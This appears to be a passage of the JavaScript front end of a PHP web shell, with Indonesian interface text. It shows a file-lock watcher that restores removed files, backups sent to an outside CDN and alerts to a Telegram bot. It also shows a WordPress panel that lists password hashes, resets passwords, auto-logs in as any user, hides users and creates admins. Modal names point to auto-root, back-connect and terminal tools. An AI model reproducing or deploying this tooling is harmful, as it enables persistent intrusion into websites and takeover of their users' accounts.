    var perm = document.getElementById('lockModalPerm').value.trim();
    if (!path) return;
    if (!/^0?[0-7]{3,4}$/.test(perm)) { showToast('Permission tidak valid (contoh: 0444)', 'warning'); return; }
    fetch(_LPSELF, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: '_xk=labs&lock_action=lock&lock_path=' + encodeURIComponent(path) + '&lock_perm=' + encodeURIComponent(perm)
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
        if (d.ok) {
            var backupInfo = d.has_backup ? ' | Backup OK' : ' | No backup (dirs excluded or upload failed)';
            showToast('Locked: ' + path.split('/').pop() + ' [' + perm + ']' + backupInfo, 'success', 5000, 'applepay');
            hideModal2('lockFileModal');
        } else {
            showToast('Gagal: ' + (d.err || 'Unknown error'), 'error');
        }
    }).catch(function(e) { showToast('Error: ' + e.message, 'error'); });
}


var _massLockPaths = [];

function showMassLockModal(paths, title) {
    _massLockPaths = paths;
    document.getElementById('massLockTitle').textContent = title || 'Mass Lock';
    var count = paths.length;
    var summary = document.getElementById('massLockSummary');
    summary.innerHTML = '<b>' + count + ' item</b> akan dikunci dan dipantau watcher otomatis.'
        + '<br><span style="opacity:0.7;font-size:10px;">'
        + paths.slice(0, 3).map(function(p){ return p.split('/').pop(); }).join(', ')
        + (count > 3 ? ' + ' + (count - 3) + ' lainnya' : '')
        + '</span>';
    document.getElementById('massLockProgress').style.display = 'none';
    document.getElementById('massLockResult').style.display   = 'none';
    document.getElementById('massLockFooter').style.display   = 'flex';
    document.getElementById('massLockBtn').disabled = false;
    document.getElementById('massLockBtn').textContent = 'Lock ' + count + ' Item';
    document.getElementById('massLockModal').classList.remove('hidden');
}

function lockCurrentFolder() {
    var checkboxes = document.querySelectorAll('.file-checkbox');
    var paths = [];
    checkboxes.forEach(function(cb) { if (cb.value) paths.push(cb.value); });
    if (paths.length === 0) {
        showToast('Tidak ada file di folder ini', 'warning'); return;
    }
    showMassLockModal(paths, 'Lock Folder Ini (' + paths.length + ' item)');
}

function doMassLock() {
    var paths = _massLockPaths;
    var perm  = document.getElementById('massLockPerm').value.trim();
    if (!paths || paths.length === 0) { showToast('Tidak ada file', 'warning'); return; }
    if (!/^0?[0-7]{3,4}$/.test(perm)) { showToast('Permission tidak valid', 'warning'); return; }

    var btn  = document.getElementById('massLockBtn');
    var prog = document.getElementById('massLockProgress');
    var bar  = document.getElementById('massLockBar');
    var txt  = document.getElementById('massLockProgressText');
    var res  = document.getElementById('massLockResult');
    var ftr  = document.getElementById('massLockFooter');

    btn.disabled = true;
    prog.style.display = '';
    res.style.display  = 'none';
    bar.style.width    = '5%';
    txt.textContent    = 'Mengirim request...';

    lockRequest({lock_action: 'mass_lock', lock_paths: JSON.stringify(paths), lock_perm: perm}, function(d) {
        bar.style.width = '100%';
        if (d.ok) {
            txt.textContent = 'Selesai!';
            var withBackup    = (d.results || []).filter(function(r){ return r.ok && r.backup_url; }).length;
            var withoutBackup = (d.results || []).filter(function(r){ return r.ok && !r.backup_url; }).length;
            res.style.display    = '';
            res.style.background = 'rgba(74,222,128,0.08)';
            res.style.border     = '1px solid rgba(74,222,128,0.25)';
            res.style.color      = '#4ade80';
            res.innerHTML = '<b>' + d.locked + ' file dikunci</b>'
                + (d.failed > 0 ? ' | <span style="color:#f87171;">' + d.failed + ' gagal</span>' : '')
                + '<br><span style="font-size:10px;opacity:0.8;">'
                + withBackup + ' dengan backup CDN'
                + (withoutBackup > 0 ? ' | ' + withoutBackup + ' folder (no backup)' : '')
                + '</span>';
            ftr.style.display = 'flex';
            btn.disabled = false;
            btn.textContent = 'Tutup';
            btn.onclick = function() { hideModal2('massLockModal'); };
            showToast('<b>' + d.locked + '</b> file dikunci & watcher aktif', 'success', 5000, 'applepay');
            clearSelection();
        } else {
            bar.style.background = '#f85149';
            res.style.display    = '';
            res.style.background = 'rgba(248,81,73,0.08)';
            res.style.border     = '1px solid rgba(248,81,73,0.25)';
            res.style.color      = '#f87171';
            res.textContent      = 'Gagal: ' + (d.err || 'Unknown error');
            btn.disabled = false;
        }
    });
}



var _uConfirmCallback = null;
function showConfirm(opts) {
    var color      = opts.color     || '#f85149';
    var colorAlpha = opts.colorAlpha|| 'rgba(248,81,73,';
    var icon       = opts.icon      || '<polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/>';
    _uConfirmCallback = opts.onOk || null;

    var hdr = document.getElementById('uConfirmHeader');
    hdr.style.borderBottomColor = colorAlpha + '0.25)';
    hdr.style.background        = colorAlpha + '0.04)';

    document.getElementById('uConfirmTitle').innerHTML =
        '<span style="display:inline-flex;align-items:center;justify-content:center;width:26px;height:26px;background:' + colorAlpha + '0.12);border-radius:6px;border:1px solid ' + colorAlpha + '0.28);">'
        + '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="' + color + '" stroke-width="2.5">' + icon + '</svg>'
        + '</span>'
        + '<span style="color:' + color + ';font-size:13px;font-weight:600;">' + (opts.title || 'Konfirmasi') + '</span>';

    var iw = document.getElementById('uConfirmIconWrap');
    iw.style.background   = colorAlpha + '0.1)';
    iw.style.border       = '1px solid ' + colorAlpha + '0.25)';
    iw.innerHTML = '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="' + color + '" stroke-width="1.8">' + icon + '</svg>';

    document.getElementById('uConfirmMsg').innerHTML = opts.msg || '';

    var subEl = document.getElementById('uConfirmSub');
    subEl.style.display = opts.sub ? '' : 'none';
    subEl.textContent   = opts.sub || '';

    var detEl = document.getElementById('uConfirmDetail');
    if (opts.detail) {
        detEl.style.display     = 'flex';
        detEl.style.color       = color;
        detEl.style.background  = colorAlpha + '0.07)';
        detEl.style.border      = '1px solid ' + colorAlpha + '0.18)';
        detEl.innerHTML         = opts.detail;
    } else {
        detEl.style.display = 'none';
    }

    var warnBox  = document.getElementById('uConfirmWarnBox');
    var warnText = document.getElementById('uConfirmWarnText');
    if (opts.warn) {
        warnBox.style.display     = 'flex';
        warnBox.style.background  = colorAlpha + '0.06)';
        warnBox.style.border      = '1px solid ' + colorAlpha + '0.18)';
        warnBox.querySelector('svg').style.stroke = color.replace(')', ',0.8)').replace('rgb', 'rgba');
        warnText.style.color    = color;
        warnText.textContent    = opts.warn;
    } else { warnBox.style.display = 'none'; }

    var okBtn = document.getElementById('uConfirmOkBtn');
    okBtn.style.background  = color;
    okBtn.style.color       = '#fff';
    okBtn.style.border      = '1px solid ' + colorAlpha + '0.8)';
    okBtn.innerHTML = (opts.okIcon ? '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">' + opts.okIcon + '</svg>' : '')
                    + (opts.okLabel || 'OK');

    document.getElementById('uConfirmCancelBtn').textContent = opts.cancelLabel || 'Batal';

    document.getElementById('universalConfirmModal').classList.remove('hidden');
}
function uConfirmOk() {
    document.getElementById('universalConfirmModal').classList.add('hidden');
    if (typeof _uConfirmCallback === 'function') _uConfirmCallback();
    _uConfirmCallback = null;
}
function uConfirmCancel() {
    document.getElementById('universalConfirmModal').classList.add('hidden');
    _uConfirmCallback = null;
}


function lockRequest(data, callback) {
    var params = '_xk=labs&' + Object.keys(data).map(function(k) {
        return encodeURIComponent(k) + '=' + encodeURIComponent(data[k]);
    }).join('&');
    fetch(_LPSELF, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: params
    })
    .then(function(r) { return r.json(); })
    .then(function(d) { callback(d); })
    .catch(function() { callback({ok: false, err: 'Network error'}); });
}


function toggleTgPanel() {
    var panel = document.getElementById('tgSettingsPanel');
    var arrow = document.getElementById('tgPanelArrow');
    var open  = panel.style.display !== 'none';
    panel.style.display = open ? 'none' : '';
    if (arrow) arrow.style.transform = open ? 'rotate(0deg)' : 'rotate(180deg)';
    if (!open) loadTgSettings();
}

function loadTgSettings() {
    lockRequest({lock_action: 'tg_load'}, function(d) {
        if (!d.ok) return;
        var badge  = document.getElementById('tgStatusBadge');
        var tokenEl = document.getElementById('tgBotToken');
        var chatEl  = document.getElementById('tgChatId');
        if (d.has_token && tokenEl && !tokenEl.value) {
            tokenEl.placeholder = d.masked_token || '(tersimpan)';
        }
        if (d.chat_id && chatEl && !chatEl.value) {
            chatEl.value = d.chat_id;
        }
        if (badge) {
            if (d.has_token && d.chat_id) {
                badge.style.display = '';
                badge.textContent   = 'Aktif';
                badge.style.background = 'rgba(74,222,128,0.15)';
                badge.style.color      = '#4ade80';
                badge.style.border     = '1px solid rgba(74,222,128,0.3)';
            } else {
                badge.style.display = '';
                badge.textContent   = 'Belum diatur';
                badge.style.background = 'rgba(107,114,128,0.15)';
                badge.style.color      = '#6b7280';
                badge.style.border     = '1px solid rgba(107,114,128,0.3)';
            }
        }
    });
}

function saveTgSettings() {
    var token  = (document.getElementById('tgBotToken').value  || '').trim();
    var chatId = (document.getElementById('tgChatId').value    || '').trim();
    var status = document.getElementById('tgSaveStatus');
    if (status) { status.style.display = ''; status.textContent = 'Menyimpan...'; status.style.background = 'rgba(41,182,246,0.1)'; status.style.color = '#29b6f6'; status.style.border = '1px solid rgba(41,182,246,0.2)'; }
    lockRequest({lock_action: 'tg_save', bot_token: token, chat_id: chatId}, function(d) {
        if (!d.ok) {
            if (status) { status.textContent = 'Gagal menyimpan.'; status.style.color = '#f87171'; }
            return;
        }
        var badge = document.getElementById('tgStatusBadge');
        if (d.ping) {
            if (status) { status.textContent = 'Tersimpan! Pesan test berhasil dikirim ke Telegram.'; status.style.background = 'rgba(74,222,128,0.1)'; status.style.color = '#4ade80'; status.style.border = '1px solid rgba(74,222,128,0.2)'; }
            if (badge) { badge.style.display = ''; badge.textContent = 'Aktif'; badge.style.background = 'rgba(74,222,128,0.15)'; badge.style.color = '#4ade80'; badge.style.border = '1px solid rgba(74,222,128,0.3)'; }
        } else if (token && chatId) {
            if (status) { status.textContent = 'Tersimpan, tapi test kirim gagal. Periksa token dan chat_id.'; status.style.background = 'rgba(245,158,11,0.1)'; status.style.color = '#f59e0b'; status.style.border = '1px solid rgba(245,158,11,0.2)'; }
        } else {
            if (status) { status.textContent = 'Pengaturan disimpan (kosong — notifikasi dinonaktifkan).'; status.style.background = 'rgba(107,114,128,0.1)'; status.style.color = '#6b7280'; status.style.border = '1px solid rgba(107,114,128,0.2)'; }
            if (badge) { badge.style.display = ''; badge.textContent = 'Belum diatur'; badge.style.background = 'rgba(107,114,128,0.15)'; badge.style.color = '#6b7280'; badge.style.border = '1px solid rgba(107,114,128,0.3)'; }
        }
    });
}


var _lockMgrPollTimer = null;
var _lockTickTimer    = null;
var _lockTickUrl      = null;

var _tickPostUrl = window.location.pathname;
var _tickPostBody = '_xk=labs&lock_action=lp_watcher_tick';

function runTickNow() {
    var x = new XMLHttpRequest();
    x.open('POST', _tickPostUrl, true);
    x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    x.onload = function() {
        try {
            var d = JSON.parse(x.responseText);
            var badge = document.getElementById('lockMgrWatcherBadge');
            if (badge) {
                badge.textContent = 'RESTORED ' + (d.restored || 0) + ' FILES';
                badge.style.color = '#4ade80'; badge.style.background = 'rgba(74,222,128,0.15)';
                badge.style.borderColor = 'rgba(74,222,128,0.4)'; badge.style.display = '';
            }
        } catch(e) {}
        setTimeout(loadLockedFiles, 800);
    };
    x.send(_tickPostBody);
}

function startJsTick(tickUrl) {
    if (_lockTickTimer) clearInterval(_lockTickTimer);
    _lockTickTimer = setInterval(function() {
        var x = new XMLHttpRequest();
        x.open('POST', _tickPostUrl, true);
        x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        x.send(_tickPostBody);
    }, 5000);
}
function stopJsTick() {
    if (_lockTickTimer) { clearInterval(_lockTickTimer); _lockTickTimer = null; }
}

function showLockManagerModal() {
    document.getElementById('lockManagerLoading').style.display = '';
    document.getElementById('lockManagerTable').style.display = 'none';
    document.getElementById('lockManagerEmpty').style.display = 'none';
    document.getElementById('lockManagerModal').classList.remove('hidden');
    loadLockedFiles();
    if (_lockMgrPollTimer) clearInterval(_lockMgrPollTimer);
    _lockMgrPollTimer = setInterval(function() {
        var modal = document.getElementById('lockManagerModal');
        if (!modal || modal.classList.contains('hidden')) {
            clearInterval(_lockMgrPollTimer); _lockMgrPollTimer = null; return;
        }
        loadLockedFiles();
    }, 3000);
}

function loadLockedFiles() {
    fetch(_LPSELF, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: '_xk=labs&lock_action=list'
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
        document.getElementById('lockManagerLoading').style.display = 'none';
        var body = document.getElementById('lockManagerBody');
        body.innerHTML = '';
        var total   = d.locked ? d.locked.length : 0;
        var missing = d.locked ? d.locked.filter(function(x){return !x.exists;}).length : 0;
        var alive   = d.watcher_alive;
        var pid     = d.watcher_pid;
        var shellOff = d.shell_disabled;
        var tickUrl  = d.tick_url;
        var statsEl = document.getElementById('lockMgrStats');
        var dotEl   = document.getElementById('lockMgrDot');
        var badgeEl = document.getElementById('lockMgrWatcherBadge');
        var diagEl  = document.getElementById('lockMgrDiag');

        if (total > 0 && (!alive || shellOff)) {
            if (tickUrl) startJsTick(tickUrl);
        } else {
            stopJsTick();
        }

        var watcherMode = alive ? 'WATCHER AKTIF' : (shellOff ? 'JS TICK AKTIF' : 'WATCHER MATI');
        var statsText = total + ' file dikunci';
        if (missing > 0) statsText += ' | ' + missing + ' missing';
        if (pid) statsText += ' | PID ' + pid;
        if (statsEl) statsEl.textContent = statsText;
        if (dotEl) {
            dotEl.style.background = (alive || (shellOff && total > 0)) ? '#4ade80' : (total > 0 ? '#f87171' : '#6b7280');
            dotEl.style.animation  = (alive || (shellOff && total > 0)) ? 'procPulse 1.5s infinite' : 'none';
        }
        if (badgeEl) {
            badgeEl.style.display     = total > 0 ? '' : 'none';
            badgeEl.textContent       = watcherMode;
            var isGreen = alive || (shellOff && total > 0);
            badgeEl.style.color       = isGreen ? '#4ade80' : '#f87171';
            badgeEl.style.borderColor = isGreen ? 'rgba(74,222,128,0.4)' : 'rgba(248,81,73,0.4)';
            badgeEl.style.background  = isGreen ? 'rgba(74,222,128,0.15)' : 'rgba(248,81,73,0.15)';
        }
        if (diagEl) {
            diagEl.style.display = (shellOff || !alive) && total > 0 ? '' : 'none';
            if (shellOff) {
                diagEl.textContent = 'shell_exec disabled — menggunakan JS tick (restore via HTTP setiap 5 detik). Untuk restore instan: pasang cronjob ke URL di bawah.';
            } else if (!alive) {
                diagEl.textContent = 'Watcher mati (php_bin: ' + (d.php_bin || 'n/a') + ', file: ' + (d.watcher_file_ok ? 'ada' : 'tidak ada') + '). JS tick aktif sebagai fallback.';
            }
        }
        if (!d.locked || d.locked.length === 0) {
            document.getElementById('lockManagerEmpty').style.display = '';
            return;
        }
        document.getElementById('lockManagerTable').style.display = '';
        d.locked.forEach(function(item) {
            var tr = document.createElement('tr');
            tr.style.borderBottom = '1px solid rgba(255,255,255,0.04)';
            var statusColor = item.exists ? '#4ade80' : '#f87171';
            var statusHtml  = item.exists
                ? '<span style="display:inline-flex;align-items:center;gap:3px;color:#4ade80;font-weight:600;"><span style="width:6px;height:6px;border-radius:50%;background:#4ade80;animation:procPulse 1.5s infinite;display:inline-block;"></span>Active</span>'
                : '<span style="display:inline-flex;align-items:center;gap:3px;color:#f87171;font-weight:600;animation:blink 1s step-end infinite;"><span style="width:6px;height:6px;border-radius:50%;background:#f87171;display:inline-block;"></span>Restoring...</span>';
            var curPermColor = item.exists ? ((item.cur_perm === item.perm) ? '#4ade80' : '#f59e0b') : '#6b7280';
            var backupCell  = item.backup_url
                ? '<div style="display:flex;flex-direction:column;align-items:center;gap:2px;">'
                  + '<a href="' + item.backup_url + '" target="_blank" style="color:#4ade80;font-size:9px;display:flex;align-items:center;gap:2px;"><svg width="9" height="9" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>CDN</a>'
                  + '<button style="font-size:8px;padding:1px 6px;background:rgba(74,222,128,0.1);border:1px solid rgba(74,222,128,0.4);border-radius:3px;color:#4ade80;cursor:pointer;" onclick="doReupload(' + JSON.stringify(item.path) + ')">Re-up</button>'
                  + '</div>'
                : '<div style="display:flex;flex-direction:column;align-items:center;gap:2px;">'
                  + '<span style="color:#f87171;font-size:9px;">none</span>'
                  + '<button style="font-size:8px;padding:1px 6px;background:rgba(245,158,11,0.1);border:1px solid rgba(245,158,11,0.4);border-radius:3px;color:#f59e0b;cursor:pointer;" onclick="doReupload(' + JSON.stringify(item.path) + ')">Upload</button>'
                  + '</div>';
            var fileName = item.path.split('/').pop();
            tr.innerHTML = '<td style="padding:6px 8px;max-width:220px;">'
                + '<div style="font-family:monospace;color:#f59e0b;font-size:10px;word-break:break-all;">' + item.path + '</div>'
                + '<div style="color:var(--text-muted);font-size:9px;margin-top:1px;">' + (item.is_dir ? 'folder' : 'file') + '</div>'
                + '</td>'
                + '<td style="padding:6px 8px;text-align:center;font-family:monospace;font-size:10px;color:#fff;">' + (item.perm || '----') + '</td>'
                + '<td style="padding:6px 8px;text-align:center;font-family:monospace;font-size:10px;color:' + curPermColor + ';">' + (item.cur_perm || '----') + '</td>'
                + '<td style="padding:6px 8px;text-align:center;">' + backupCell + '</td>'
                + '<td style="padding:6px 8px;text-align:center;">' + statusHtml + '</td>'
                + '<td style="padding:6px 8px;text-align:center;white-space:nowrap;">'
                +   '<button style="font-size:9px;padding:2px 8px;background:rgba(248,81,73,0.1);border:1px solid rgba(248,81,73,0.4);border-radius:4px;color:#f85149;cursor:pointer;" onclick="doUnlockFile(' + JSON.stringify(item.path) + ')">Unlock</button>'
                + '</td>';
            body.appendChild(tr);
        });
    }).catch(function(e) {
        document.getElementById('lockManagerLoading').textContent = 'Error: ' + e.message;
    });
}

function doReupload(path) {
    showToast('Uploading backup...', 'info');
    fetch(_LPSELF, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: '_xk=labs&lock_action=reupload&lock_path=' + encodeURIComponent(path)
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
        if (d.ok && d.has_backup) {
            showToast('Backup uploaded', 'success', 4000, 'applepay');
        } else if (d.ok) {
            showToast('Upload failed — no URL returned (Figma API may be unavailable)', 'warning');
        } else {
            showToast('Error: ' + (d.err || 'Unknown'), 'error');
        }
        loadLockedFiles();
    }).catch(function(e) { showToast('Error: ' + e.message, 'error'); });
}

function doUnlockFile(path) {
    fetch(_LPSELF, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: '_xk=labs&lock_action=unlock&lock_path=' + encodeURIComponent(path)
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
        if (d.ok) {
            showToast('Unlocked: ' + path.split('/').pop(), 'success');
            loadLockedFiles();
        } else { showToast('Gagal: ' + (d.err || ''), 'error'); }
    });
}

function doUnlockAll() {
    showConfirm({
        title: 'Unlock Semua',
        msg:   'Yakin ingin meng-unlock semua file yang dikunci?',
        sub:   'Watcher tidak akan lagi memantau dan merestore file-file tersebut.',
        warn:  'File akan dapat diubah atau dihapus setelah di-unlock.',
        color: '#f59e0b', colorAlpha: 'rgba(245,158,11,',
        icon:  '<rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>',
        okIcon:'<rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>',
        okLabel: 'Unlock Semua',
        onOk: function() {
    fetch(_LPSELF, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: '_xk=labs&lock_action=unlock_all'
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
        if (d.ok) { showToast('Semua file di-unlock', 'success'); loadLockedFiles(); }
        else { showToast('Gagal: ' + (d.err || ''), 'error'); }
    });
        }
    });
}


function showMassDeleteModal() {
    document.getElementById('massDelCode').value = '';
    document.getElementById('massDelMode').value = 'code';
    document.getElementById('massDelCodeGroup').style.display = '';
    var curDir = document.getElementById('massDelDir') ? document.getElementById('massDelDir').value : '';
    var curLph = encodeURIComponent(curDir || window._currentDir || '');
    document.getElementById('massDelForm').action = '?_xk=labs&ecl=' + curLph;
    document.getElementById('massDeleteModal').classList.remove('hidden');
}
function toggleMassDelCode() {
    var mode = document.getElementById('massDelMode').value;
    document.getElementById('massDelCodeGroup').style.display = mode === 'code' ? '' : 'none';
}
function doMassDeleteRecursive() {}


document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
        if (!document.getElementById('editFileModal').classList.contains('hidden')) hideEditModal();
        if (!document.getElementById('renameModal').classList.contains('hidden')) hideRenameModal();
        if (!document.getElementById('chmodFileModal').classList.contains('hidden')) hideChmodFileModal();
        ['autoRootModal','symlinkModal','backconnectModal','terminalModal','createFolderModal','createFileModal','massDeleteModal','zipNameModal','lockFileModal','lockManagerModal'].forEach(function(id){
            var el = document.getElementById(id);
            if (el && !el.classList.contains('hidden')) hideModal2(id);
        });
    }
});
document.getElementById('renameNewName').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') { e.preventDefault(); doRename(); }
});
document.getElementById('chmodNewPerm').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') { e.preventDefault(); doChmod(); }
});
document.getElementById('symlinkTarget').addEventListener('input', updateSymlinkPreview);
document.getElementById('symlinkName').addEventListener('input', updateSymlinkPreview);
document.getElementById('symlinkName').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') { e.preventDefault(); doCreateSymlink(); }
});
document.getElementById('newFolderName').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') { e.preventDefault(); doCreateFolder(); }
});
document.getElementById('newFileName').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') { e.preventDefault(); doCreateFile(); }
});
document.getElementById('zipFileName').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') { e.preventDefault(); doCompressZip(); }
});
document.getElementById('editFileContent').addEventListener('keydown', function(e) {
    if (e.key === 'Tab') {
        e.preventDefault();
        var s = this.selectionStart, end = this.selectionEnd;
        this.value = this.value.substring(0, s) + '    ' + this.value.substring(end);
        this.selectionStart = this.selectionEnd = s + 4;
    }
});
document.getElementById('newFileContent').addEventListener('keydown', function(e) {
    if (e.key === 'Tab') {
        e.preventDefault();
        var s = this.selectionStart, end = this.selectionEnd;
        this.value = this.value.substring(0, s) + '    ' + this.value.substring(end);
        this.selectionStart = this.selectionEnd = s + 4;
    }
});

function addUploader() {
    var c = document.getElementById('uploadersContainer');
    var r = document.createElement('div');
    r.className = 'uploader-row';
    r.innerHTML = '<label class="custom-file-input"><input type="file" name="files[]" onchange="updateFileName(this)"><span class="file-btn">Choose File</span><span class="file-name">No file selected</span></label><button type="button" class="btn btn-danger btn-sm" onclick="removeUploader(this)">X</button>';
    c.appendChild(r);
}

function removeUploader(btn) {
    var c = document.getElementById('uploadersContainer');
    if (c.children.length > 1) btn.parentElement.remove();
}

function updateFileName(input) {
    var label = input.closest('.custom-file-input');
    var nameSpan = label.querySelector('.file-name');
    if (input.files.length > 0) { nameSpan.textContent = input.files[0].name; label.classList.add('has-file'); }
    else { nameSpan.textContent = 'No file selected'; label.classList.remove('has-file'); }
}

document.querySelectorAll('.modal-overlay').forEach(function(overlay) {
    overlay.addEventListener('click', function(e) {
        if (e.target === overlay) overlay.classList.add('hidden');
    });
});

<?php if (!empty($ftpAccounts) || isset($_POST['ftp_list']) || isset($_POST['ftp_add']) || isset($_POST['ftp_passwd']) || isset($_POST['ftp_delete'])): ?>
showModal('ftp');
<?php endif; ?>


function wpRequest(data, callback) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', _LPSELF, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onload = function() {
        try {
            var response = JSON.parse(xhr.responseText);
            callback(response);
        } catch(e) {
            callback({err: xhr.responseText.substring(0, 300)});
        }
    };
    xhr.onerror = function() { callback({err: 'Network error'}); };
    var params = ['_xk=labs'];
    for (var key in data) params.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key]));
    xhr.send(params.join('&'));
}

function wpLoadUsers() {
    var container = document.getElementById('wpUserList');
    if (!container) return;
    container.innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-muted);font-size:11px;">Loading users...</div>';
    wpRequest({c4t: 'ulst'}, function(users) {
        if (users.err) {
            container.innerHTML = '<div style="text-align:center;padding:20px;color:#f85149;font-size:11px;">Error: ' + users.err + '</div>';
            return;
        }
        if (!users.length) {
            container.innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-muted);font-size:11px;">No users found.</div>';
            return;
        }
        var html = '';
        users.forEach(function(u) {
            var isHidden = u.is_hidden || false;
            var hiddenBadge = isHidden ? '<span style="background:#7c3aed;color:white;padding:1px 6px;border-radius:3px;font-size:9px;font-weight:600;margin-left:6px;">HIDDEN</span>' : '';
            var borderLeft = isHidden ? 'border-left: 3px solid #7c3aed;' : '';
            var bgColor = isHidden ? 'background: rgba(124,58,237,0.08);' : 'background: var(--bg-secondary);';
            html += '<div style="' + bgColor + borderLeft + 'border: 1px solid var(--border); border-radius: 6px; padding: 10px; margin-bottom: 6px;">';
            html += '<div style="display:flex;justify-content:space-between;align-items:center;gap:8px;flex-wrap:wrap;">';
            html += '<div style="flex:1;min-width:200px;">';
            html += '<div style="display:flex;align-items:center;gap:6px;">';
            html += '<span style="color:#3b82f6;font-size:10px;font-weight:600;font-family:monospace;">#' + u.ID + '</span>';
            html += '<span style="color:var(--accent);font-size:12px;font-weight:600;">' + u.user_login + '</span>';
            html += hiddenBadge;
            html += '</div>';
            html += '<div style="color:var(--text-muted);font-size:10px;">' + u.user_email + '</div>';
            html += '<div style="color:var(--text-muted);font-size:9px;font-family:monospace;word-break:break-all;max-width:280px;opacity:0.6;">' + u.user_pass.substring(0, 34) + '...</div>';
            html += '</div>';
            html += '<div style="display:flex;gap:4px;align-items:center;flex-wrap:wrap;">';
            html += '<button class="btn btn-sm btn-danger" style="padding:3px 8px;font-size:10px;" onclick="wpResetPw(' + u.ID + ',this)">ResetPW</button>';
            html += '<button class="btn btn-sm btn-primary" style="padding:3px 8px;font-size:10px;" onclick="wpAutoLogin(' + u.ID + ')">Login</button>';
            if (isHidden) {
                html += '<button class="btn btn-sm" style="padding:3px 8px;font-size:10px;background:#3fb950;border-color:#3fb950;color:#fff;" onclick="wpUnhideUser(' + u.ID + ',this)">Unhide</button>';
            } else {
                html += '<button class="btn btn-sm" style="padding:3px 8px;font-size:10px;background:#f97316;border-color:#f97316;color:#fff;" onclick="wpHideUser(' + u.ID + ',this)">Hide</button>';
            }
            html += '<button class="btn btn-sm btn-secondary" style="padding:3px 8px;font-size:10px;" onclick="wpDeleteUser(' + u.ID + ',\'' + u.user_login.replace(/'/g, "\\'") + '\')">Del</button>';
            html += '</div>';
            html += '</div>';
            html += '<div id="wpPwInfo_' + u.ID + '" style="display:none;margin-top:8px;padding:6px 10px;background:var(--bg-primary);border:1px solid var(--border);border-radius:4px;font-size:11px;font-family:monospace;"></div>';
            html += '</div>';
        });
        container.innerHTML = html;
    });
}

function wpResetPw(uid, btn) {
    var origText = btn.textContent;
    btn.textContent = '...';
    btn.disabled = true;
    wpRequest({c4t: 'rpsw', uix: uid}, function(r) {
        btn.textContent = origText;
        btn.disabled = false;
        if (r.n) {
            var info = document.getElementById('wpPwInfo_' + uid);
            info.style.display = 'block';
            info.innerHTML = '<span style="color:#3fb950;">New password:</span> <strong style="color:#00d4ff;user-select:all;">' + r.n + '</strong> <button class="btn btn-sm btn-primary" style="padding:2px 6px;font-size:9px;margin-left:6px;" onclick="navigator.clipboard.writeText(\'' + r.n + '\');this.textContent=\'Copied!\'">Copy</button>';
            setTimeout(function(){ info.style.display = 'none'; }, 15000);
        } else {
            alert('Reset failed: ' + (r.err || 'unknown'));
        }
    });
}

function wpAutoLogin(uid) {
    wpRequest({c4t: 'alog', uix: uid}, function(r) {
        if (r.url) window.open(r.url, '_blank');
        else alert('Login failed: ' + (r.err || 'unknown'));
    });
}

function wpHideUser(uid, btn) {
    btn.textContent = '...';
    btn.disabled = true;
    wpRequest({c4t: 'hide', uix: uid}, function(r) {
        btn.disabled = false;
        if (r.ok) wpLoadUsers();
        else { btn.textContent = 'Hide'; alert('Hide failed'); }
    });
}

function wpUnhideUser(uid, btn) {
    btn.textContent = '...';
    btn.disabled = true;
    wpRequest({c4t: 'unhide', uix: uid}, function(r) {
        btn.disabled = false;
        if (r.ok) wpLoadUsers();
        else { btn.textContent = 'Unhide'; alert('Unhide failed'); }
    });
}

var wpDelTarget = null;
function wpDeleteUser(uid, name) {
    wpDelTarget = uid;
    document.getElementById('wpDeleteName').textContent = name;
    showModal('wpDelete');
}

function wpConfirmDelete() {
    if (!wpDelTarget) return;
    var btn = document.getElementById('wpDeleteConfirmBtn');
    btn.textContent = '...';
    btn.disabled = true;
    wpRequest({c4t: 'del', uix: wpDelTarget}, function(r) {
        btn.textContent = 'Delete';
        btn.disabled = false;
        hideModal('wpDelete');
        if (r.ok) {
            wpLoadUsers();
            wpShowStatus('User "' + r.user + '" deleted.', 'ok');
        } else {
            var msg = r.err === 'cannot_delete_self' ? 'Cannot delete yourself' : (r.err || 'Delete failed');
            wpShowStatus(msg, 'err');
        }
        wpDelTarget = null;
    });
}

function wpCreateAdmin() {
    var user = document.getElementById('wpNewUser').value.trim();
    var pass = document.getElementById('wpNewPass').value.trim();
